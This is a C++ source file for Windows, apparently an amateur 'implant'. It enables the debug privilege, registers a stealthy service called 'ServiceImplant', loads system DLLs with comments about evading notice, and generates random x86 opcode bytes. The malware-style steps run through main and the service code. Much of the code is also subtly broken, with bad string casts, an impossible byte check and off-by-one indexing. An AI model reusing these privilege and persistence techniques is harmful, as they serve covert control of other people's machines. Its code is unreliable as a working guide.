#include <Windows.h>
#include <iostream>
#include <vector>
#include <unordered_map>
#include <unordered_set>
#include <system_error>
#include <thread>
#include <functional>
#include <random>
#include <set>
struct KernIssues {
	std::unordered_map<std::string, int> errors;
	std::multiset<std::pair<int, std::string>> DllErrors;
};

KernIssues Issues;
struct ErrorOp {
	std::error_code operator()(std::error_code ec) {
		if (ec) {
			Issues.DllErrors.insert({ ec.value(), ec.category().name() });
			std::cerr << "Error: " << ec.message() << std::endl;
		}
		return ec;
	}
	ErrorOp() {
		operator()(std::error_code(GetLastError(), std::system_category()));
	}

	int operator()(int error) {
		if (error != 0) {
			std::error_code ec = std::error_code(error, std::system_category());
			Issues.DllErrors.insert({ ec.value(), ec.category().name() });
			std::cerr << "Error: " << error << std::endl;
			operator()(ec);
		}
		return error;
	}
};

auto g_hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
/*
* Windows Service main similar to program int main however in relation to the service im running from the prorgam executed.
*/
void ServiceMain(DWORD argc, LPTSTR* argv) {
	std::cout << "Implant is operational.." << std::endl;
	Sleep(600000);
	SetEvent(g_hStopEvent); // 10 minutes service shutdown
}

void ServiceCtrlHandler(DWORD dwCtrl) {
	switch (dwCtrl) {
	case SERVICE_CONTROL_STOP:
		SetEvent(g_hStopEvent);
		return;
	}
}

void PassAdminPrivileges(std::thread& t) {
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		std::cerr << "Error opening process token: " << GetLastError() << std::endl;
		return;
	}

	TOKEN_PRIVILEGES tp{};
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
		std::cerr << "Error looking up privilege value: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
		std::cerr << "Error adjusting token privileges: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return;
	}
	CloseHandle(hToken);

	t = std::thread([] {
		SERVICE_TABLE_ENTRY DispatchTable[] = {
		  { (LPTSTR)(L"ServiceImplant"), reinterpret_cast<LPSERVICE_MAIN_FUNCTION>(ServiceMain) },
		  { NULL, NULL }
		};
	if (!StartServiceCtrlDispatcher(DispatchTable)) {
		std::cerr << "Implant failed: " << GetLastError() << std::endl;
	}
		});
	t.detach();
}


void Kern(SYSTEMTIME* systemTime) {
	struct DllStore {
		std::vector<LPCWSTR> dlls;
		int DLLCount;
	};
	DllStore dllList = {
	{ L"kernel32.dll", L"shell32.dll" },
	2
	};
	//tries to do two things first is the attempt to do it more sneaky 
	//got first see if the dll process is already running if it is then the module handle can handle the present dll  
	//without the use of loadlibrary

	//however the worst situation is gonna be the load library as this will be the most obvious because it will be a new process
	//that is being created and the dll will be loaded into that process
	for (int i = 0; i < dllList.DLLCount; ++i) {
		HINSTANCE hDll = GetModuleHandle(dllList.dlls[i]);
		if (hDll == NULL) {
			hDll = LoadLibrary(dllList.dlls[i]);
			if (hDll == NULL) {
				DWORD error = GetLastError();
				std::cerr << "Handle for the dll Has Failed" << (std::string*)dllList.dlls[i] << ".errorcode: " << error << std::endl;
				Issues.DllErrors.insert({ error, "LoadLibrary" });
				continue;
			}
		}
		std::cout << "Loaded " << (std::string*)dllList.dlls[i] << std::endl;
	}
	std::thread t;
	PassAdminPrivileges(t);
	ErrorOp errorOp;
	errorOp(GetLastError());
}

/*
* Binary Instruction generation
* 
*/
std::vector<unsigned char> generate_instruction() {
	std::mt19937 RandomPos(std::random_device{}());
	std::uniform_int_distribution<int> dist(0, 9); //0-9
	std::vector<std::vector<unsigned char>> x86_instructions = {
	{0x90}, {0xC3}, {0x89, 0xD8}, {0xFF, 0xE3}, {0x50}, {0x5B},
	{0x01, 0xD8}, {0x29, 0xD8}, {0x0F, 0xAF, 0xC3}, {0xF7, 0xFB} //9
	};
	int index = dist(RandomPos); //0-9 (rng value)	
	return x86_instructions[index];
}

std::vector<unsigned char> generate_instructions(int count) {
	std::vector<unsigned char> x86_code;
	for (int i = 0; i < count; ++i) {
		std::vector<unsigned char> instruction = generate_instruction();
		x86_code.insert(x86_code.end(), instruction.begin(), instruction.end());
	}
	return x86_code;
}
struct Random {
	std::function<std::vector<unsigned char>()> binaryx64 = []() {
		auto binaryRun = []() {
			std::vector<unsigned char> x86_code = generate_instructions(1000);
			bool syntax_error = false;
			for (unsigned char byte : x86_code) {
				if (byte > 0xFF) {
					syntax_error = true;
					break;
				}
			}
			if (syntax_error) {
				std::cerr << "Invalid Opcode" << std::endl;
				return std::vector<unsigned char>();
			}
			else {

				return x86_code;
			}
		};
		return binaryRun();
	};
};
Random Bin64x;
std::vector<unsigned char> BInstructions = Bin64x.binaryx64();
int binaryTestPointOne() {
	if (BInstructions.empty()) {
		return 1;
	}else return 0;
}
std::vector<std::pair<unsigned char, unsigned char>> InstructionCheck() {
	bool ValidBinaryOne = false;
	int BinaryReturnSignal = binaryTestPointOne();
	if (BinaryReturnSignal == 0) {
		ValidBinaryOne = true;
		std::vector<unsigned char> localInstruct(250);
		std::vector<unsigned char> localInstructOne(250);
		std::mt19937 Rand(std::random_device{}());
		std::uniform_int_distribution<int> dist(0, 999); //0-999 instructions
		for (unsigned char Instruction : BInstructions) {
			int randomIndex = dist(Rand); // get a random index pos from 0 - 999
			if (randomIndex < 500) {
				localInstruct[randomIndex % 250] = Instruction;
			}
			else {
				localInstructOne[randomIndex % 250] = Instruction;
			}
		}
		std::vector<std::pair<unsigned char, unsigned char>> InstructionsMap;
		for (int i = 0; i < 250; ++i) {
			InstructionsMap.push_back({ localInstruct[i], localInstructOne[i] });
		}
		return InstructionsMap;
	}
	else {
		return std::vector<std::pair<unsigned char, unsigned char>>();
	}
}
unsigned char instruction() {
	std::set<unsigned char> instructionNew;
	std::vector<std::pair<unsigned char, unsigned char>> instructions = InstructionCheck();
	for (auto& [first, second] : instructions) {
		instructionNew.insert(first);
		instructionNew.insert(second);
	}
	unsigned char instructionbyte[250]{};
	int i = 0;
	for (unsigned char val : instructionNew) {
		instructionbyte[++i] = val;
	}
	std::mt19937 Random(std::random_device{}());
	std::uniform_int_distribution<int> dist(0, 250);
	int rando = dist(Random);
	return instructionbyte[rando];
}

int main() {
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	Kern(&systemTime);
	instruction();
}
